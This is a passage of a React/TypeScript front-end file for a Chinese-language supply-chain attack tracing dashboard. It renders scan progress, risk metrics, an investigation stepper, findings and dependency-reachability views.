      animate={reducedMotion ? undefined : { opacity: 1, y: 0, scale: 1 }}
      transition={{ duration: 0.42, ease: workbenchMotionEase }}
    >
      <div className='flex flex-wrap items-center justify-between gap-2'>
        <div>
          <div className='text-section-title'>扫描进度</div>
          <div className='mt-1 text-page-meta'>
            {running ? '各模块正在按顺序扫描当前导入项目' : completed ? '扫描流程已结束' : '等待开始扫描'}
          </div>
        </div>
        <Badge variant='outline' className='rounded-md'>
          {percent}%
        </Badge>
      </div>
      <div className='relative h-2 overflow-hidden rounded-full bg-muted'>
        <motion.div
          className='h-full rounded-full bg-primary shadow-[0_0_18px_rgba(34,211,238,0.45)]'
          initial={reducedMotion ? false : { width: 0 }}
          animate={{ width: `${percent}%` }}
          transition={{ duration: running ? 0.75 : 1.1, ease: workbenchMotionEase }}
        />
        {running ? (
          <div className='absolute inset-0 bg-gradient-to-r from-transparent via-white/20 to-transparent opacity-60 motion-safe:animate-pulse' />
        ) : null}
      </div>
      <div className='grid gap-2 sm:grid-cols-2 xl:grid-cols-4'>
        {steps.map((step, index) => {
          const showMessage = ['skipped', 'failed', 'running'].includes(step.status)
          return (
            <motion.div
              key={step.id}
              className='rounded-md border bg-card p-3 transition-[border-color,background-color,box-shadow,transform] duration-300 hover:-translate-y-0.5 hover:border-cyan-400/30 hover:shadow-md hover:shadow-cyan-950/10'
              initial={reducedMotion ? false : { opacity: 0, y: 12, scale: 0.96 }}
              animate={reducedMotion ? undefined : { opacity: 1, y: 0, scale: 1 }}
              transition={{ type: 'spring', stiffness: 360, damping: 27, mass: 0.75, delay: index * 0.04 }}
            >
              <div className='flex items-center justify-between gap-2'>
                <span className='truncate text-sm font-medium'>{step.label}</span>
                <ScanStatusBadge status={step.status} />
              </div>
              {showMessage ? (
                <div className='mt-2 line-clamp-2 text-subtle'>
                  {step.message}
                </div>
              ) : null}
            </motion.div>
          )
        })}
      </div>
      {failedSteps.length || skippedSteps.length ? (
        <div className='rounded-md border border-amber-200 bg-amber-50/70 p-3 text-sm text-amber-950 dark:border-amber-900 dark:bg-amber-950/25 dark:text-amber-100'>
          {failedSteps.length ? (
            <div className='font-medium'>扫描完成，但有 {failedSteps.length} 个模块失败。</div>
          ) : null}
          {skippedSteps.length ? (
            <div className='mt-1'>有 {skippedSteps.length} 个模块缺少材料，已标记为待补充。</div>
          ) : null}
          {failedSteps.length ? (
            <div className='mt-2 space-y-1'>
              {failedSteps.map((step) => (
                <div key={step.id} className='line-clamp-2 text-xs'>
                  {step.label}：{step.message}
                </div>
              ))}
            </div>
          ) : null}
        </div>
      ) : null}
    </motion.div>
  )
}

function ScanStatusBadge({ status, solid = false }: { status: ScanStepStatus; solid?: boolean }) {
  const label = {
    pending: '等待',
    running: '扫描中',
    completed: '完成',
    skipped: '待补',
    failed: '失败',
  }[status]
  const classes = solid
    ? {
        pending: 'border-white/30 bg-white/10 text-white',
        running: 'border-white/30 bg-white/10 text-white',
        completed: 'border-white/35 bg-white/20 text-white',
        skipped: 'border-slate-950/20 bg-slate-950/10 text-slate-950',
        failed: 'border-white/35 bg-white/20 text-white',
      }[status]
    : {
    pending: 'text-muted-foreground',
    running: 'border-cyan-200 bg-cyan-50 text-cyan-700 dark:border-cyan-900 dark:bg-cyan-950/30 dark:text-cyan-200',
    completed: 'border-emerald-200 bg-emerald-50 text-emerald-700 dark:border-emerald-900 dark:bg-emerald-950/30 dark:text-emerald-200',
    skipped: 'border-amber-200 bg-amber-50 text-amber-700 dark:border-amber-900 dark:bg-amber-950/30 dark:text-amber-200',
    failed: 'border-red-200 bg-red-50 text-red-700 dark:border-red-900 dark:bg-red-950/30 dark:text-red-200',
  }[status]
  return (
    <Badge variant='outline' className={cn('rounded-md', classes)}>
      {status === 'running' ? <Loader2 className='mr-1 size-3 animate-spin' /> : null}
      {label}
    </Badge>
  )
}

export function OverviewPanel({ workspace }: { workspace: SecurityWorkspace }) {
  const assistant = getAssistantPayload(workspace)
  const modules = workspace.modules ?? []
  const findings = workspace.findings ?? []

  return (
    <div className='space-y-4'>
      <section className='grid gap-4 xl:grid-cols-[minmax(0,1fr)_420px]'>
        <div className='space-y-4'>
          <div className='space-y-2'>
            <Badge variant='outline' className='rounded-md border-cyan-200 bg-cyan-50 text-cyan-700'>
              APT 溯源 · SBOM · CI/CD · 产物可信 · 日志印证
            </Badge>
            <h1 className='text-page-title'>
              {workspace.workspace.name} APT 供应链攻击溯源总览
            </h1>
            <p className='max-w-3xl text-body'>
              围绕污染入口、被污染环节、受影响资产和攻击路径组织多源证据，支撑供应链攻击检测与溯源研判。
            </p>
          </div>

          <div className='grid gap-3 md:grid-cols-2 xl:grid-cols-4'>
            <MetricCard
              icon={ShieldAlert}
              label='打开风险'
              value={workspace.summary.open_findings.toString()}
              detail={`${workspace.summary.critical_findings} 项严重风险`}
              tone='red'
            />
            <MetricCard
              icon={PackageCheck}
              label='依赖包'
              value={workspace.summary.dependencies.toString()}
              detail='SBOM 风险评分已生成'
              tone='cyan'
            />
            <MetricCard
              icon={GitPullRequestArrow}
              label='构建步骤'
              value={workspace.summary.build_steps.toString()}
              detail={`${workspace.summary.attack_paths} 条攻击路径`}
              tone='orange'
            />
            <MetricCard
              icon={Radar}
              label='日志事件'
              value={compactNumber(workspace.summary.log_events)}
              detail={`${workspace.summary.mean_triage_minutes} 分钟平均研判`}
              tone='emerald'
            />
          </div>

          <div className='rounded-md border bg-muted/25 p-3 text-sm text-muted-foreground'>
            GraphRAG + GNN 智能证据、扫描范围和证据缺口已合并到溯源报告中，避免在总览页重复展示。
          </div>
        </div>

        <Card className='rounded-md'>
          <CardHeader className='pb-3'>
          <CardTitle className='flex items-center gap-2 text-section-title'>
              <Siren className='size-4 text-red-600' />
              溯源结论与处置优先级
            </CardTitle>
          </CardHeader>
          <CardContent className='space-y-4'>
            <RiskDial score={workspace.summary.risk_score} level={workspace.summary.risk_level} />
            <p className='text-body'>
              {assistant.answer}
            </p>
            <div className='space-y-2'>
              {assistant.next_actions.slice(0, 3).map((action) => (
                <div key={action} className='flex gap-2 rounded-md border p-2 text-sm'>
                  <CheckCircle2 className='mt-0.5 size-4 shrink-0 text-emerald-600' />
                  <span>{action}</span>
                </div>
              ))}
            </div>
          </CardContent>
        </Card>
      </section>

      <section className='grid gap-4 xl:grid-cols-[minmax(0,1.25fr)_minmax(340px,0.75fr)]'>
        <Card className='rounded-md'>
          <CardHeader>
            <CardTitle className='flex items-center gap-2 text-base'>
              <Radar className='size-4 text-cyan-600' />
              攻击链时间线与证据演进
            </CardTitle>
          </CardHeader>
          <CardContent>
            <RiskTrendChart workspace={workspace} />
          </CardContent>
        </Card>
        <Card className='rounded-md'>
          <CardHeader>
            <CardTitle className='flex items-center gap-2 text-base'>
              <ClipboardList className='size-4 text-emerald-600' />
              供应链溯源能力覆盖
            </CardTitle>
          </CardHeader>
          <CardContent className='space-y-3'>
            {modules.map((module) => (
              <ModuleRow key={module.key} module={module} />
            ))}
          </CardContent>
        </Card>
      </section>

      <FindingsPanel findings={findings} />
    </div>
  )
}

export function InvestigationDotStepper({
  workspace,
  activeStepId,
  onJump,
}: {
  workspace: SecurityWorkspace
  activeStepId: InvestigationStepId
  onJump: (target: string) => void
}) {
  const guidance = workspace.guidance
  const nextActions = guidance?.nextActions?.length
    ? guidance.nextActions
    : [{ title: '查看溯源总览', description: '先确认综合结论、证据完整度和下一步动作。', target: 'overview' }]
  const activeStep =
    investigationSteps.find((step) => step.id === activeStepId) ??
    investigationSteps[0]
  const primaryAction = nextActions[0]

  return (
    <Card className='rounded-md border-cyan-200 bg-cyan-50/50 dark:border-cyan-900 dark:bg-cyan-950/20'>
      <CardContent className='space-y-4 p-4'>
        <div className='flex flex-wrap items-start justify-between gap-3'>
          <div>
            <div className='flex flex-wrap items-center gap-2'>
              <Badge variant='outline' className='rounded-md border-cyan-300 bg-background text-cyan-700 dark:text-cyan-200'>
                当前步骤：{guidance?.currentStepLabel ?? '供应链溯源'}
              </Badge>
              <span className='text-sm font-medium'>跟着 6 步完成一次 APT 供应链攻击调查</span>
            </div>
            <p className='mt-1 text-sm text-muted-foreground'>
              {guidance?.defenseNotice ?? '当前案例为防御性安全仿真，目标是验证检测、证据融合和溯源报告能力。'}
            </p>
          </div>
          <Button size='sm' onClick={() => onJump(primaryAction?.target ?? activeStep.defaultTarget)}>
            <Sparkles />
            {primaryAction?.title ?? '查看下一步'}
          </Button>
        </div>

        <div className='flex flex-wrap items-center gap-2 rounded-md border bg-[color:var(--surface-panel)] p-3'>
          {investigationSteps.map((step, index) => {
            const state = getInvestigationStepState(workspace, step, activeStepId)
            return (
              <button
                key={step.id}
                type='button'
                onClick={() => onJump(step.defaultTarget)}
                className='group flex min-w-0 items-center gap-2 rounded-md px-2 py-1.5 text-left transition hover:bg-muted'
                title={`${step.order}. ${step.title}：${step.description}`}
              >
                <span
                  className={cn(
                    'grid size-7 shrink-0 place-items-center rounded-full border text-xs font-semibold transition',
                    state === 'done' &&
                      'border-emerald-300 bg-emerald-100 text-emerald-700 dark:border-emerald-800 dark:bg-emerald-950 dark:text-emerald-300',
                    state === 'current' &&
                      'border-cyan-400 bg-cyan-100 text-cyan-700 ring-2 ring-cyan-200 dark:border-cyan-700 dark:bg-cyan-950 dark:text-cyan-300 dark:ring-cyan-900',
                    state === 'missing' &&
                      'border-orange-300 bg-orange-50 text-orange-700 dark:border-orange-900 dark:bg-orange-950/40 dark:text-orange-300',
                    state === 'pending' &&
                      'border-border bg-muted text-muted-foreground'
                  )}
                >
                  {state === 'done' ? <CheckCircle2 className='size-4' /> : index + 1}
                </span>
                <span className='hidden min-w-0 sm:block'>
                  <span className='block truncate text-xs font-medium'>{step.title}</span>
                  <span className='block truncate text-[11px] text-muted-foreground'>
                    {step.shortTitle}
                  </span>
                </span>
              </button>
            )
          })}
        </div>

        <div className='grid gap-2 md:grid-cols-2'>
          <div className='rounded-md border bg-background p-3'>
            <div className='text-sm font-medium'>
              当前正在查看：第 {activeStep.order} 步 · {activeStep.title}
            </div>
            <div className='mt-1 text-xs text-muted-foreground'>{activeStep.description}</div>
          </div>
          {nextActions.slice(0, 1).map((action) => (
            <div key={`${action.title}-${action.target}`} className='flex items-start justify-between gap-3 rounded-md border bg-background p-3'>
              <div>
                <div className='text-sm font-medium'>{action.title}</div>
                <div className='mt-1 text-xs text-muted-foreground'>{action.description}</div>
              </div>
              <Button variant='outline' size='sm' onClick={() => onJump(action.target)}>
                前往
              </Button>
            </div>
          ))}
        </div>
      </CardContent>
    </Card>
  )
}

function WorkspaceTabs({
  tabs,
  activeTabId,
  onSelect,
  onClose,
}: {
  tabs: WorkspaceTab[]
  activeTabId: WorkspaceTab['id']
  onSelect: (tab: WorkspaceTab) => void
  onClose: (tabId: WorkspaceTab['id']) => void
}) {
  const reducedMotion = useReducedMotion()

  return (
    <div className='border-b bg-muted/30 shadow-sm shadow-slate-950/10'>
      <ScrollArea orientation='horizontal'>
      <div className='flex w-max min-w-full items-end gap-1.5 px-3 pt-2'>
        {tabs.map((tab) => {
          const active = tab.id === activeTabId
          return (
            <div
              key={tab.id}
              className={cn(
                'relative flex h-11 items-center gap-1 overflow-hidden rounded-t-md border border-b-0 px-3 text-sm transition-[border-color,color,background-color,box-shadow,transform] duration-300',
                active
                  ? 'border-cyan-400/35 bg-background text-foreground shadow-lg shadow-cyan-950/20'
                  : 'border-transparent bg-transparent text-muted-foreground hover:-translate-y-0.5 hover:bg-background/65 hover:text-foreground'
              )}
            >
              {active ? (
                reducedMotion ? (
                  <span className='absolute inset-0 rounded-t-md bg-background' />
                ) : (
                  <motion.span
                    layoutId='workspace-active-tab-surface'
                    className='absolute inset-0 rounded-t-md bg-background'
                    transition={{ type: 'spring', stiffness: 460, damping: 34, mass: 0.7 }}
                  />
                )
              ) : null}
              {active ? (
                reducedMotion ? (
                  <span className='absolute inset-x-2 bottom-0 h-0.5 rounded-full bg-cyan-400' />
                ) : (
                  <motion.span
                    layoutId='workspace-active-tab-rail'
                    className='absolute inset-x-2 bottom-0 h-0.5 rounded-full bg-cyan-400 shadow-[0_0_18px_rgba(34,211,238,0.8)]'
                    transition={{ type: 'spring', stiffness: 500, damping: 36, mass: 0.7 }}
                  />
                )
              ) : null}
              <button
                type='button'
                className='relative z-10 max-w-48 truncate font-medium'
                title={tab.description ?? tab.title}
                onClick={() => onSelect(tab)}
              >
                {tab.title}
              </button>
              {tab.closable ? (
                <button
                  type='button'
                  className='relative z-10 grid size-6 place-items-center rounded-sm text-muted-foreground transition hover:bg-muted hover:text-foreground active:scale-90'
                  title={`关闭 ${tab.title}`}
                  onClick={() => onClose(tab.id)}
                >
                  <X className='size-3.5' />
                </button>
              ) : null}
            </div>
          )
        })}
      </div>
      </ScrollArea>
    </div>
  )
}

function getInvestigationStepState(
  workspace: SecurityWorkspace,
  step: InvestigationStep,
  activeStepId: InvestigationStepId
) {
  if (step.id === activeStepId) return 'current'
  const doneByStep: Record<InvestigationStepId, boolean> = {
    case: true,
    preflight: Boolean(workspace.code_audit || workspace.dependency_audit || workspace.workspace),
    risk: Boolean(workspace.dependency_audit?.scan_id || workspace.dependencies?.length),
    corroboration: Boolean(
      workspace.cicd_audit?.scan_id ||
        workspace.artifact_trust?.scan_id ||
        workspace.log_audit?.scan_id ||
        workspace.multimodal_audit?.scan_id
    ),
    path: Boolean(workspace.summary.attack_paths || workspace.graph?.attack_paths?.length),
    report: Boolean(workspace.report),
  }
  if (doneByStep[step.id]) return 'done'
  if (step.id === 'corroboration' && doneByStep.risk) return 'missing'
  return 'pending'
}

export function currentInvestigationStepId(workspace: SecurityWorkspace): InvestigationStepId {
  const guidanceStepMap: Record<string, InvestigationStepId> = {
    case: 'case',
    preflight: 'preflight',
    supply: 'risk',
    risk: 'risk',
    corroborate: 'corroboration',
    corroboration: 'corroboration',
    graph: 'path',
    path: 'path',
    report: 'report',
  }
  const guidanceStep = workspace.guidance?.currentStep
  if (guidanceStep && guidanceStepMap[guidanceStep]) {
    return guidanceStepMap[guidanceStep]
  }
  if (!workspace.dependency_audit?.scan_id && !workspace.dependencies?.length) return 'risk'
  if (
    !workspace.cicd_audit?.scan_id &&
    !workspace.artifact_trust?.scan_id &&
    !workspace.log_audit?.scan_id
  ) {
    return 'corroboration'
  }
  if (!workspace.summary.attack_paths && !workspace.graph?.attack_paths?.length) return 'path'
  if (!workspace.report) return 'report'
  return 'report'
}

function ModuleQuestion({
  title,
  question,
  terms,
}: {
  title: string
  question: string
  terms: string[]
}) {
  void title
  void question
  terms.forEach(termHelpText)
  return null
}

function termHelpText(term: string) {
  const help: Record<string, string> = {
    SBOM: '软件物料清单，用来说明项目实际包含哪些组件和版本。',
    VEX: '漏洞可利用性说明，用来区分受影响、暂不受影响和仍需调查的组件。',
    'SLSA provenance': '构建来源证明，用来核对产物来自哪个仓库、commit、workflow 和 builder。',
    'artifact digest': '产物哈希摘要，用来确认发布物是否被替换或污染。',
    'self-hosted runner': '自托管构建机，能力强但需要额外确认隔离和可信边界。',
    证据缺口: '当前判断还缺少的关键材料，例如日志、产物证明或调用路径。',
  }
  return help[term] || '这个概念会帮助你理解本页证据如何支撑供应链溯源结论。'
}

function useAnimatedNumber(
  target: number,
  options: {
    stiffness?: number
    damping?: number
    delayMs?: number
    durationMs?: number
    respectReducedMotion?: boolean
    resetKey?: string | number
  } = {}
) {
  const prefersReducedMotion = useReducedMotion()
  const reducedMotion = options.respectReducedMotion !== false && prefersReducedMotion
  const motionValue = useMotionValue(reducedMotion ? target : 0)
  const delayMs = options.delayMs ?? 360
  const durationMs = options.durationMs ?? 2400
  const resetKey = options.resetKey
  const spring = useSpring(motionValue, {
    stiffness: options.stiffness ?? 95,
    damping: options.damping ?? 22,
    mass: 0.8,
  })
  const [value, setValue] = useState(reducedMotion ? target : 0)

  useLayoutEffect(() => {
    if (reducedMotion) {
      motionValue.jump(target)
      setValue(target)
      return
    }
    motionValue.jump(0)
    setValue(0)
    let frameId = 0
    const timeoutId = window.setTimeout(() => {
      const startedAt = performance.now()
      const animateFrame = (now: number) => {
        const elapsed = Math.max(0, now - startedAt)
        const rawProgress = Math.min(1, elapsed / durationMs)
        const easedProgress = 1 - Math.pow(1 - rawProgress, 3)
        const nextValue = target * easedProgress
        motionValue.set(nextValue)
        setValue(Math.round(nextValue))
        if (rawProgress < 1) {
          frameId = window.requestAnimationFrame(animateFrame)
        } else {
          motionValue.set(target)
          setValue(Math.round(target))
        }
      }
      frameId = window.requestAnimationFrame(animateFrame)
    }, delayMs)
    return () => {
      window.clearTimeout(timeoutId)
      if (frameId) window.cancelAnimationFrame(frameId)
    }
  }, [motionValue, reducedMotion, target, delayMs, durationMs, resetKey])

  useMotionValueEvent(spring, 'change', (latest) => {
    setValue(Math.round(latest))
  })

  return { value, spring }
}

function RiskDial({ score, level }: { score: number; level: string }) {
  const reducedMotion = useReducedMotion()
  const { value: displayScore, spring } = useAnimatedNumber(score, {
    stiffness: 34,
    damping: 13,
    delayMs: 520,
    durationMs: 3200,
    respectReducedMotion: false,
  })
  const progress = useTransform(spring, [0, 100], [0, 1])
  const orbitRotation = useTransform(spring, (latest) => Math.max(0, Math.min(100, latest)) * 3.6)
  const circumference = 2 * Math.PI * 44
  const dashOffset = useTransform(progress, (value) => circumference * (1 - Math.max(0, Math.min(1, value))))
  const glowOpacity = useTransform(progress, [0, 0.75, 1], [0.08, 0.25, 0.38])
  const glowScale = useTransform(progress, [0, 1], [0.9, 1.06])
  const ringColor =
    score >= 90
      ? '#dc2626'
      : score >= 75
        ? '#f97316'
        : score >= 60
          ? '#f59e0b'
          : '#10b981'

  return (
    <div className='flex items-center gap-4 rounded-md border bg-background p-3'>
      <div className='relative grid size-24 place-items-center' aria-label={`综合风险评分 ${score}`}>
        <motion.div
          className='absolute inset-2 rounded-full blur-lg'
          style={{ backgroundColor: ringColor, opacity: glowOpacity, scale: reducedMotion ? 1 : glowScale }}
        />
        <svg className='relative size-24 -rotate-90' viewBox='0 0 100 100' role='img'>
          <circle
            cx='50'
            cy='50'
            r='44'
            fill='none'
            stroke='hsl(var(--muted))'
            strokeWidth='10'
          />
          <motion.circle
            cx='50'
            cy='50'
            r='44'
            fill='none'
            stroke={ringColor}
            strokeWidth='10'
            strokeLinecap='round'
            strokeDasharray={circumference}
            style={{ strokeDashoffset: dashOffset }}
          />
        </svg>
        <motion.div
          className='absolute inset-0'
          style={{ rotate: reducedMotion ? score * 3.6 : orbitRotation }}
        >
          <span
            className='absolute left-1/2 top-[6px] size-3 -translate-x-1/2 rounded-full border-2 border-background shadow-sm'
            style={{ backgroundColor: ringColor }}
          />
        </motion.div>
        <motion.span
          className='absolute grid size-16 place-items-center rounded-full bg-background text-2xl font-bold text-red-700 ring-1 ring-border dark:text-red-300'
          initial={reducedMotion ? false : { scale: 0.88 }}
          animate={reducedMotion ? undefined : { scale: [0.88, 1.08, 1] }}
          transition={{ duration: 0.75, ease: [0.16, 1, 0.3, 1] }}
        >
          {displayScore}
        </motion.span>
      </div>
      <div>
        <div className='text-xs uppercase text-muted-foreground'>综合风险评分</div>
        <div className='mt-1 text-lg font-semibold'>{level.toUpperCase()}</div>
        <div className='text-xs text-muted-foreground'>严重供应链攻击迹象</div>
      </div>
    </div>
  )
}

function MetricCard({
  icon: Icon,
  label,
  value,
  detail,
  tone,
}: {
  icon: typeof ShieldAlert
  label: string
  value: string
  detail: string
  tone: 'red' | 'cyan' | 'orange' | 'emerald'
}) {
  const toneClass = {
    red: 'text-red-600 bg-red-50 dark:bg-red-950/35',
    cyan: 'text-cyan-600 bg-cyan-50 dark:bg-cyan-950/35',
    orange: 'text-orange-600 bg-orange-50 dark:bg-orange-950/35',
    emerald: 'text-emerald-600 bg-emerald-50 dark:bg-emerald-950/35',
  }[tone]

  return (
    <Card className='rounded-md'>
      <CardContent className='flex items-center justify-between gap-3 p-4'>
        <div className='min-w-0'>
          <div className='text-label'>{label}</div>
          <div className='mt-1 text-metric text-foreground'>{value}</div>
          <div className='mt-2 truncate text-subtle'>{detail}</div>
        </div>
        <div className={cn('grid size-10 shrink-0 place-items-center rounded-md', toneClass)}>
          <Icon className='size-5' />
        </div>
      </CardContent>
    </Card>
  )
}

function RiskTrendChart({ workspace }: { workspace: SecurityWorkspace }) {
  return (
    <ResponsiveContainer width='100%' height={300}>
      <AreaChart data={workspace.trend ?? []} margin={{ left: 0, right: 10 }}>
        <CartesianGrid strokeDasharray='3 3' className='stroke-muted' />
        <XAxis dataKey='day' tickLine={false} axisLine={false} fontSize={12} />
        <YAxis tickLine={false} axisLine={false} fontSize={12} />
        <Tooltip />
        <Area type='monotone' dataKey='dependency' name='依赖风险' stroke='#dc2626' fill='#dc2626' fillOpacity={0.14} />
        <Area type='monotone' dataKey='runtime' name='运行日志' stroke='#0891b2' fill='#0891b2' fillOpacity={0.12} />
        <Area type='monotone' dataKey='build' name='构建链路' stroke='#ea580c' fill='#ea580c' fillOpacity={0.1} />
        <Area type='monotone' dataKey='code' name='可达性佐证' stroke='#059669' fill='#059669' fillOpacity={0.1} />
      </AreaChart>
    </ResponsiveContainer>
  )
}

function ModuleRow({ module }: { module: SecurityWorkspace['modules'][number] }) {
  return (
    <div className='space-y-2 rounded-md border p-3'>
      <div className='flex items-center justify-between gap-3'>
        <div className='font-medium'>{module.name}</div>
        <Badge variant='outline' className={cn('rounded-md', statusClasses[module.status] || statusClasses.observed)}>
          {module.signals} signals
        </Badge>
      </div>
      <div className='text-body'>{module.description}</div>
      <RiskBar value={module.score} />
    </div>
  )
}

function FindingsPanel({ findings }: { findings: SecurityFinding[] }) {
  return (
    <Card className='rounded-md'>
      <CardHeader>
        <CardTitle className='flex items-center gap-2 text-section-title'>
          <ShieldAlert className='size-4 text-red-600' />
          优先处置风险
        </CardTitle>
      </CardHeader>
      <CardContent>
        <div className='grid gap-3 lg:grid-cols-2'>
          {findings.map((finding) => (
            <FindingItem key={finding.id} finding={finding} />
          ))}
        </div>
      </CardContent>
    </Card>
  )
}

function FindingItem({ finding }: { finding: SecurityFinding }) {
  return (
    <div className='rounded-md border p-4'>
      <div className='flex flex-wrap items-center gap-2'>
        <Badge variant='outline' className={cn('rounded-md', severityClasses[finding.severity])}>
          {severityLabels[finding.severity]}
        </Badge>
        <Badge variant='outline' className='rounded-md'>
          {finding.id}
        </Badge>
        <span className='text-xs text-muted-foreground'>{finding.first_seen}</span>
      </div>
      <div className='mt-3 font-semibold'>{finding.title}</div>
      <div className='mt-1 text-sm text-muted-foreground'>{finding.asset}</div>
      <p className='mt-3 text-sm leading-6'>{finding.evidence}</p>
      <div className='mt-3 flex flex-wrap items-center gap-2 text-xs text-muted-foreground'>
        <span>owner: {finding.owner}</span>
        <Separator orientation='vertical' className='h-4' />
        <span>score: {finding.score}</span>
        <Separator orientation='vertical' className='h-4' />
        <span>{finding.status}</span>
      </div>
    </div>
  )
}

function SupplyReachabilityPanel({
  workspace,
  workspaceId,
  importId,
  onCodeScanned,
  onDependencyScanned,
  onSupplementProjectArchive,
}: {
  workspace: SecurityWorkspace
  workspaceId?: string
  importId?: string
  onCodeScanned: (audit: CodeAuditResult) => void
  onDependencyScanned: (audit: DependencyAuditResult) => void
  onSupplementProjectArchive: (file: File) => Promise<void>
  animationKey: number
}) {
  const vulnerabilityCoverage = workspace.dependency_audit?.summary.vulnerability_coverage
  const dependencies = useMemo(
    () => {
      const rows = [
        ...(workspace.dependencies ?? []),
        ...(workspace.dependency_audit?.dependencies ?? []),
      ]
      const unique = new Map<string, SecurityDependency>()
      rows.forEach((dependency) => {
        unique.set(dependencyKey(dependency), dependency)
      })
      return Array.from(unique.values()).sort((a, b) => (b.risk ?? 0) - (a.risk ?? 0))
    },
    [workspace.dependencies, workspace.dependency_audit?.dependencies]
  )
  const reachability = buildReachabilityViewModel(workspace)
  const reachabilityItems = useMemo(
    () => buildReachabilityItems(dependencies, workspace.code_audit?.findings ?? [], reachability, workspace.multimodal_audit?.summary.evidence_count ?? 0),
    [dependencies, reachability, workspace.code_audit?.findings, workspace.multimodal_audit?.summary.evidence_count]
  )
  const [reachabilityFilter, setReachabilityFilter] = useState<ReachabilityStatus | 'all'>('all')
  const [severityFilter, setSeverityFilter] = useState<SecuritySeverity | 'all'>('all')
  const [selectedDependencyId, setSelectedDependencyId] = useState('')
  const [, setActiveEvidence] = useState('dependency')
  const [scanning, setScanning] = useState(false)
  const [supplementing, setSupplementing] = useState(false)
  const supplementInputRef = useRef<HTMLInputElement>(null)
  const baseRows = reachabilityItems
  const reachabilityOptions = reachabilityStatusOrder
  const severityOptions = severityOrder
  const filteredRows = useMemo(
    () =>
      baseRows.filter((item) => {
        const itemReachability = normalizeReachabilityStatus(item.status)
        const itemSeverity = normalizeSeverity(item.severity)
        const matchesReachability = reachabilityFilter === 'all' || itemReachability === reachabilityFilter
        const matchesSeverity = severityFilter === 'all' || itemSeverity === severityFilter

        return matchesReachability && matchesSeverity
      }),
    [baseRows, reachabilityFilter, severityFilter]
  )
  useEffect(() => {
    if (!reachabilityItems.length) return
    const selectableRows = filteredRows.length ? filteredRows : reachabilityItems
    if (!selectedDependencyId || !selectableRows.some((item) => item.id === selectedDependencyId)) {
      setSelectedDependencyId(selectableRows[0].id)
    }
  }, [filteredRows, reachabilityItems, selectedDependencyId])
  const selectedItem =
    filteredRows.find((item) => item.id === selectedDependencyId) ??
    reachabilityItems.find((item) => item.id === selectedDependencyId) ??
    reachabilityItems.find((item) => item.name === reachability.targetDependency?.name) ??
    reachabilityItems[0]
  useEffect(() => {
    if (!import.meta.env.DEV) return

    const countBy = <T,>(rows: ReachabilityAnalysisItem[], keyFor: (row: ReachabilityAnalysisItem) => T) =>
      rows.reduce<Record<string, number>>((counts, row) => {
        const key = String(keyFor(row))
        counts[key] = (counts[key] ?? 0) + 1
        return counts
      }, {})

    console.debug('[ReachabilityFilter]', {
      reachabilityFilter,
      severityFilter,
      baseRowsCount: baseRows.length,
      filteredRowsCount: filteredRows.length,
      baseStatuses: countBy(baseRows, (row) => normalizeReachabilityStatus(row.status)),
      filteredStatuses: countBy(filteredRows, (row) => normalizeReachabilityStatus(row.status)),
      baseSeverities: countBy(baseRows, (row) => normalizeSeverity(row.severity)),
      filteredSeverities: countBy(filteredRows, (row) => normalizeSeverity(row.severity)),
    })
  }, [baseRows, filteredRows, reachabilityFilter, severityFilter])
  const hasDependencies = reachabilityItems.length > 0
  const dependencyAuditCompleted = Boolean(workspace.dependency_audit?.scan_id)
  const directDependencies = reachabilityItems.filter((item) => item.dependency.dependency_type !== 'transitive').length
  const vulnerableDependencies = workspace.dependency_audit?.summary.vulnerable_dependencies
    ?? reachabilityItems.filter((item) => item.advisories.length > 0).length
  const reachableDependencies = reachabilityItems.filter((item) => normalizeReachabilityStatus(item.status) === 'reachable').length
  const pendingDependencies = reachabilityItems.length - reachableDependencies
  const evidenceGapCount = reachabilityItems.reduce((count, item) => count + item.missing.length, 0)
  const ecosystems = Array.from(new Set(reachabilityItems.map((item) => item.packageManager).filter(Boolean)))
  const projectLabel = workspace.import?.projectName || workspace.workspace.name || '当前项目'
  const branchLabel = workspace.workspace.branch || '未识别分支'
  const generatedAt = formatLocalDateTime(workspace.dependency_audit?.generated_at, { fallback: '' })

  async function rerunReachability() {
    setScanning(true)
    try {
      const [codeAudit, dependencyAudit] = await Promise.all([
        runCodeAuditScan({ workspaceId, importId, timeoutSeconds: 180, includeCheckov: false }),
        runDependencyAuditScan({
          workspaceId,
          importId,
          includeOsv: true,
          includeCdxgen: false,
          includeCyclonedxPy: false,
          mode: 'auto',
        }),
      ])
      onCodeScanned(codeAudit)
      onDependencyScanned(dependencyAudit)
    } catch (error) {
      toast.error(error instanceof Error ? error.message : '重新研判失败')
    } finally {
      setScanning(false)
    }
  }

  async function handleSupplementFileChange(event: ChangeEvent<HTMLInputElement>) {
    const file = event.target.files?.[0]
    event.target.value = ''
    if (!file) return
    if (!isSupplementProjectArchive(file.name)) {
      toast.error('请选择 .zip、.tar.gz 或 .tgz 项目压缩包')
      return
    }
    setSupplementing(true)
    try {
      await onSupplementProjectArchive(file)
    } catch (error) {
      toast.error(error instanceof Error ? error.message : '补充文件处理失败')
    } finally {
      setSupplementing(false)
    }
  }

  return (
    <div className='space-y-4'>
      <section className='rounded-md border border-border bg-[color:var(--surface-card)] px-5 py-4'>
        <div className='flex flex-wrap items-start justify-between gap-4'>
          <div className='min-w-0'>
            <div className='flex items-center gap-3'>
              <span className='grid size-9 place-items-center rounded-md border border-cyan-300/25 bg-cyan-400/10 text-cyan-600 dark:text-cyan-100'>
                <Route className='size-5' />
              </span>
              <h2 className='text-page-title text-page-title-on-dark'>供应链可达性研判</h2>
            </div>
            <div className='mt-3 flex flex-wrap items-center gap-2'>
              <span className='text-sm font-medium text-foreground'>{projectLabel}</span>
              <span className='text-muted-foreground'>/</span>
              <span className='text-sm text-muted-foreground'>{branchLabel}</span>
              <span className={cn(
                'inline-flex items-center gap-1.5 rounded-full border px-2 py-0.5 text-xs font-medium',
                hasDependencies
                  ? 'border-emerald-300/45 bg-emerald-500/10 text-emerald-700 dark:text-emerald-200'
                  : 'border-amber-300/45 bg-amber-500/10 text-amber-700 dark:text-amber-200'
              )}>
                <span className={cn('size-1.5 rounded-full', hasDependencies ? 'bg-emerald-500' : 'bg-amber-500')} />
                {hasDependencies ? `已识别 ${reachabilityItems.length} 个依赖` : dependencyAuditCompleted ? '未识别到依赖' : '尚未研判'}
              </span>
              {generatedAt ? <span className='text-xs text-muted-foreground'>更新于 {generatedAt}</span> : null}
            </div>
          </div>
          <div className='flex flex-wrap gap-2'>
            <Button size='sm' className={actionButtonClass} onClick={() => void rerunReachability()} disabled={scanning}>
